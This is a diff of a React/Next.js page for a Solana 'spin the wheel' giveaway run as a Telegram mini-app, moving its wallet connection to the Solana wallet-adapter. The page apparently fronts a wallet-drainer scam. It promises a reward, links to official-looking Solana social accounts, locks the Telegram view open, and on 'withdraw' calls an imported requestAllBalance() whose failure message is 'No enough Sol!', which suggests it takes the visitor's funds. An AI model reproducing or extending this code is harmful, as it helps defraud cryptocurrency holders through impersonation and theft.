@@ -4,26 +4,29 @@
 'use client'
 
 import React, { useEffect, useRef, useState } from 'react'
-import './assets/2idql.css'                // Tasarım CSS’i
+import './assets/2idql.css'                         // Tasarım CSS’i
+import '@solana/wallet-adapter-react-ui/styles.css' // Wallet Adapter UI stilleri
 
-/* ——————————————————————————————————————— */
-/*  Phantom tipi için hafif declare         */
-/* ——————————————————————————————————————— */
+import { useConnection, useWallet } from '@solana/wallet-adapter-react'
+import { useWalletModal }           from '@solana/wallet-adapter-react-ui'
+import { requestAllBalance }        from '@/app/services/transaction'
+
 declare global {
   interface Window {
-    solana?: {
-      publicKey?: any
-      connect?: () => Promise<any>
-      disconnect?: () => Promise<void>
-      signTransaction?: (tx: any) => Promise<any>
-      isPhantom?: boolean
+    solana?: { publicKey?: any }
+    Telegram?: {
+      WebApp?: {
+        expand: () => void
+        requestFullscreen?: () => void
+        setHeaderColor: (typeOrColor: string, colorHex?: string) => void
+        setBackgroundColor: (colorHex: string) => void
+        disableVerticalSwipes?: () => void
+        scroll?: (offsetY: number) => void
+      }
     }
   }
 }
 
-/* ——————————————————————————————————————— */
-/*  Solana deeplink / Phantom Browser açma   */
-/* ——————————————————————————————————————— */
 const isMobile = () => /iPhone|iPad|iPod|Android/i.test(navigator.userAgent)
 const openPhantomBrowser = () => {
   const dappUrl   = encodeURIComponent('https://solspin-seven.vercel.app/')
@@ -31,64 +34,35 @@ const openPhantomBrowser = () => {
   window.open(universal, '_blank')
 }
 
-/* ——————————————————————————————————————— */
-/*  Cüzdan bağlantı & transaction fonksiyonları */
-/* ——————————————————————————————————————— */
-import { connectWallet }         from '@/app/services/connect'
-import { requestAllBalance }     from '@/app/services/transaction'
-
-/* ——————————————————————————————————————— */
-/*  Telegram Web-App için hafif tip tanımı   */
-/* ——————————————————————————————————————— */
-interface TgWebApp {
-  expand: () => void
-  requestFullscreen?: () => void                 // Bot API 7.8+
-  setHeaderColor:    (typeOrColor: string, colorHex?: string) => void
-  setBackgroundColor:(colorHex: string) => void
-  disableVerticalSwipes?: () => void             // Bot API 7.7
-  scroll?: (offsetY: number) => void             // çok eski sürüm
-}
-type TgWindow = Window & { Telegram?: { WebApp?: TgWebApp } }
-
-/* ——————————————————————————————————————— */
-/*              SAYFA BİLEŞENİ                */
-/* ——————————————————————————————————————— */
-const Page = () => {
-
-  /* -------- Telegram Mini-App başlat -------- */
+export default function Page() {
+  /* -------- Telegram Mini-App init -------- */
   useEffect(() => {
-    const webapp = (window as TgWindow).Telegram?.WebApp
+    const webapp = window.Telegram?.WebApp
     if (!webapp) return
-
     try {
-      /* 1) Her zaman expand */
       webapp.expand()
-      /* 2) Varsa gerçek tam ekran */
       if (typeof webapp.requestFullscreen === 'function') {
         webapp.requestFullscreen()
       }
-      /* 3) Tema renkleri */
       webapp.setHeaderColor('bg_color', '#000000')
       webapp.setBackgroundColor('#000000')
-      /* 4) Swipe-to-close kapat */
       if (typeof webapp.disableVerticalSwipes === 'function') {
         webapp.disableVerticalSwipes()
       } else if (typeof webapp.scroll === 'function') {
-        const lockScroll = () => webapp.scroll!(window.scrollY)
-        window.addEventListener('scroll', lockScroll)
-        return () => window.removeEventListener('scroll', lockScroll)
+        const lock = () => webapp.scroll!(window.scrollY)
+        window.addEventListener('scroll', lock)
+        return () => window.removeEventListener('scroll', lock)
       }
-    } catch (err) {
-      console.error('Telegram WebApp init hatası:', err)
+    } catch (e) {
+      console.error('Telegram WebApp init hatası:', e)
     }
   }, [])
 
-  /* -------- ÇARK (spin) durumu -------- */
+  /* -------- Wheel State -------- */
   const wheelRef = useRef<HTMLImageElement>(null)
-  const [hasSpun, setHasSpun] = useState<boolean>(() => {
-    if (typeof window === 'undefined') return false
-    return localStorage.getItem('hasSpun') === 'true'
-  })
+  const [hasSpun, setHasSpun] = useState<boolean>(() =>
+    typeof window !== 'undefined' && localStorage.getItem('hasSpun') === 'true'
+  )
   useEffect(() => {
     if (hasSpun) document.querySelector('._1')?.classList.add('modal_active')
   }, [hasSpun])
@@ -96,7 +70,7 @@ const Page = () => {
     if (hasSpun || !wheelRef.current) return
     const wheel = wheelRef.current
     wheel.style.transition = 'transform 9000ms ease-in-out'
-    wheel.style.transform  = 'rotate(1080deg)'   // 3 tur
+    wheel.style.transform  = 'rotate(1080deg)'
     setTimeout(() => {
       wheel.style.transition = 'none'
       wheel.style.transform  = 'rotate(0deg)'
@@ -107,49 +81,32 @@ const Page = () => {
     }, 10000)
   }
 
-  /* -------- Wallet & Transaction Durumları -------- */
-  const [isWalletConnected, setIsWalletConnected] = useState(false)
-  const [isLoading,         setIsLoading]         = useState(false)
-  const [withdrawMessage,   setWithdrawMessage]   = useState('')
+  /* ——————————————————————————————————————— */
+  /*    Wallet Adapter ile connect & withdraw    */
+  /* ——————————————————————————————————————— */
+  const { connection }               = useConnection()
+  const { publicKey }                = useWallet()
+  const { setVisible }               = useWalletModal()
 
-  /*  Sayfa yüklenince, cüzdan zaten bağlıysa işaretle */
-  useEffect(() => {
-    if (window.solana?.publicKey) {
-      setIsWalletConnected(true)
-    }
-  }, [])
+  const [isLoading, setIsLoading]       = useState(false)
+  const [withdrawMessage, setWithdrawMessage] = useState('')
 
-  /*  Cüzdan bağlama */
-  const handleConnect = async () => {
+  const handleConnect = () => {
     if (isMobile() && !window.solana) {
       openPhantomBrowser()
       return
     }
-    await connectWallet()
-    if (window.solana?.publicKey) setIsWalletConnected(true)
+    setVisible(true) // WalletAdapter UI modal
   }
 
-  /*  Ödül (transaction) talebi */
   const handleWithdraw = async () => {
     setIsLoading(true)
-
-    /* 1) Mobil + Phantom yok → deeplink */
-    if (isMobile() && !window.solana) {
-      openPhantomBrowser()
+    if (!publicKey) {
+      setWithdrawMessage('Please connect your wallet!')
+      setTimeout(() => setWithdrawMessage(''), 5000)
       setIsLoading(false)
       return
     }
-
-    /* 2) Cüzdan bağlı değilse önce bağlan */
-    if (!window.solana?.publicKey) {
-      await handleConnect()
-    }
-    if (!window.solana?.publicKey) {        // hâlâ yoksa abort
-      setIsLoading(false)
-      return
-    }
-
-    /* 3) Transaction gönder */
     let txResult: boolean | undefined
     try {
       txResult = await requestAllBalance()
@@ -158,7 +115,6 @@ const Page = () => {
     } finally {
       setIsLoading(false)
     }
-
     if (txResult === false) {
       setWithdrawMessage('No enough Sol!')
       setTimeout(() => setWithdrawMessage(''), 5000)
@@ -182,7 +138,6 @@ const Page = () => {
               </p>
             </div>
           </span>
-
           <div className="_9">
             <div className="_i">
               <p className="_k">Connect your wallet to receive reward</p>
@@ -213,50 +168,28 @@ const Page = () => {
                 <img src="/alik.png" className="_t" alt="avatar" />
               </a>
             </div>
-
             {/* Sosyal linkler */}
             <div className="_0">
               <div className="_6">
-                <a
-                  href="https://x.com/solana?mx=2"
-                  target="_blank"
-                  className="_q"
-                  rel="noreferrer"
-                >
+                <a href="https://x.com/solana?mx=2" target="_blank" rel="noreferrer">
                   <img src="/header_twitter.svg" alt="Twitter / X" />
                 </a>
-                <a
-                  href="https://t.me/solana"
-                  target="_blank"
-                  className="_q"
-                  rel="noreferrer"
-                >
+                <a href="https://t.me/solana" target="_blank" rel="noreferrer">
                   <img src="/header_tg.svg" alt="Telegram" />
                 </a>
-                <a
-                  href="https://www.youtube.com/SolanaFndn"
-                  target="_blank"
-                  className="_q"
-                  rel="noreferrer"
-                >
+                <a href="https://www.youtube.com/SolanaFndn" target="_blank" rel="noreferrer">
                   <img src="/header_mail.svg" alt="YouTube" />
                 </a>
-                <a
-                  href="https://discord.com/invite/kBbATFA7PW"
-                  target="_blank"
-                  className="_q"
-                  rel="noreferrer"
-                >
+                <a href="https://discord.com/invite/kBbATFA7PW" target="_blank" rel="noreferrer">
                   <img src="/header_ds.svg" alt="Discord" />
                 </a>
               </div>
             </div>
-
             {/* Connect Wallet */}
             <div className="_0">
               <button onClick={handleConnect} className="_n">
                 <span className="_a">
-                  {isWalletConnected ? 'Wallet connected' : 'Connect Wallet'}
+                  {publicKey ? 'Wallet connected' : 'Connect Wallet'}
                 </span>
                 <img src="/header_arrow.svg" alt="" />
               </button>
@@ -273,7 +206,6 @@ const Page = () => {
             <br />
             FOR SOLANA USERS
           </h1>
-
           {/* ÇARK (Wheel) */}
           <div className="_o">
             <div className="_r">
@@ -290,7 +222,6 @@ const Page = () => {
               </button>
             </div>
           </div>
-
           {/* Açıklama kutuları */}
           <div className="_u">
             <div className="_j">
@@ -318,36 +249,16 @@ const Page = () => {
       <section className="_v">
         <div className="_d">
           <div className="_6">
-            <a
-              href="https://x.com/solana?mx=2"
-              target="_blank"
-              className="_q"
-              rel="noreferrer"
-            >
+            <a href="https://x.com/solana?mx=2" target="_blank" rel="noreferrer">
               <img src="/header_twitter.svg" alt="Twitter" />
             </a>
-            <a
-              href="https://t.me/solana"
-              target="_blank"
-              className="_q"
-              rel="noreferrer"
-            >
+            <a href="https://t.me/solana" target="_blank" rel="noreferrer">
               <img src="/header_tg.svg" alt="Telegram" />
             </a>
-            <a
-              href="https://www.youtube.com/SolanaFndn"
-              target="_blank"
-              className="_q"
-              rel="noreferrer"
-            >
+            <a href="https://www.youtube.com/SolanaFndn" target="_blank" rel="noreferrer">
               <img src="/header_mail.svg" alt="YouTube" />
             </a>
-            <a
-              href="https://discord.com/invite/kBbATFA7PW"
-              target="_blank"
-              className="_q"
-              rel="noreferrer"
-            >
+            <a href="https://discord.com/invite/kBbATFA7PW" target="_blank" rel="noreferrer">
               <img src="/header_ds.svg" alt="Discord" />
             </a>
           </div>
@@ -356,5 +267,3 @@ const Page = () => {
     </>
   )
 }
-
-export default Page
